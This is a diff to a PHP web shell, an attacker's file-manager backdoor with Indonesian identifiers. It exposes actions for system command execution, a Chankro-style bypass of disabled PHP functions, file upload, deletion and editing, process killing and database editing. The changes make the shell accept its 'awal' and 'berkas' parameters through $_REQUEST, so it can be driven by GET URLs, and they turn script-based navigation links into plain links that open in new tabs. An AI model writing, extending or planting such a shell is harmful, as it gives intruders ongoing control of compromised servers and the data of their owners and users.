@@ -47,7 +47,9 @@ $safeMode = (bool) ini_get('safe_mode') || stripos(ini_get('open_basedir'), '/')
 // List of allowed actions
 $actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder', 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file', 'edit_db_row', 'edit_db_form', 'db_logout', 'kill_proc', 'ubah_perm', 'fetch_file', 'chankro_kom');
 // Initial action validation from POST, default to "dasar"
-$awal = isset($_POST['awal']) && in_array($_POST['awal'],$actions) ? $_POST['awal'] : "dasar";
+// Menggunakan $_REQUEST agar bisa membaca parameter dari URL (GET)
+$req_awal = isset($_REQUEST['awal']) ? $_REQUEST['awal'] : '';
+$awal = isset($req_awal) && in_array($req_awal, $actions) ? $req_awal : "dasar";
 $database = '';
 // Function to encrypt string with base64_encode
 function kunci($str)
@@ -128,7 +130,8 @@ function tulisLah()
             $cumulative_path .= '/';
         }
         $cumulative_path .= $component;
-        $path_parts[] = "<a href='javascript:navigate(\"berkas\", \"" . kunci($cumulative_path) . "\")' style='color:#FFFFFF;'>" . htmlspecialchars($component) . "</a>";
+        // Menggunakan urlencode agar karakter Base64 aman di URL
+$path_parts[] = "<a href='?awal=dasar&berkas=" . urlencode(kunci($cumulative_path)) . "' style='color:#FFFFFF;'>" . htmlspecialchars($component) . "</a>";
     }
 
     echo implode("<span style='color:#ddd;'>/</span>", $path_parts);
@@ -375,9 +378,10 @@ function runChankroModified($command, $dir) {
 }
 
 $default_dir = getcwd();
-if(isset($_POST['berkas']) && is_string($_POST['berkas']))
+// Menggunakan $_REQUEST agar folder bisa dibuka via URL
+if(isset($_REQUEST['berkas']) && is_string($_REQUEST['berkas']))
 {
-	$decoded_path = uraikan($_POST['berkas']);
+	$decoded_path = uraikan($_REQUEST['berkas']);
     // Basic path validation
     if ($decoded_path && is_dir($decoded_path)) {
         $default_dir = realpath($decoded_path);
@@ -1963,19 +1967,20 @@ else
                 print '<tr><td>';
                 
                 if($item['is_dir']) {
-                    print '<i class="fas fa-folder" style="color:#FFD700; margin-right: 5px;"></i>';
-                    $navPath = '';
-                    if ($element == '..') {
-                        $navPath = kunci(dirname($default_dir));
-                    } else {
-                        $navPath = kunci($fileNamaLengkap);
-                    }
-                    print '<a href="javascript:navigate(\'berkas\', \'' . $navPath . '\')" style="font-weight:600; color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
-                } else {
-                    print '<i class="fas fa-file" style="color:#FFFFFF; margin-right: 5px;"></i>';
-                    print '<a href="javascript:navigate(\'awal\', \'baca_file\', \'fayl\', \'' . kunci($element) . '\', \'berkas\', \'' . kunci($default_dir) . '\')" style="color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
-                }
-
+    print '<i class="fas fa-folder" style="color:#FFD700; margin-right: 5px;"></i>';
+    $navPath = '';
+    if ($element == '..') {
+        $navPath = kunci(dirname($default_dir));
+    } else {
+        $navPath = kunci($fileNamaLengkap);
+    }
+    // BENAR: Menggunakan href biasa (GET) agar bisa New Tab
+    print '<a href="?awal=dasar&berkas=' . urlencode($navPath) . '" style="font-weight:600; color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
+} else {
+    print '<i class="fas fa-file" style="color:#FFFFFF; margin-right: 5px;"></i>';
+    // SARAN: Ubah juga bagian ini agar file bisa dibuka di New Tab
+    print '<a href="?awal=baca_file&fayl=' . urlencode(kunci($element)) . '&berkas=' . urlencode(kunci($default_dir)) . '" style="color:#FFFFFF;">' . htmlspecialchars($element) . '</a>';
+}
                 print '</td>
                         <td>' . sizeFormat(@filesize($fileNamaLengkap)) . '</td>
                         <td>' . (date('d M Y, H:i', @filemtime($fileNamaLengkap))) . '</td>
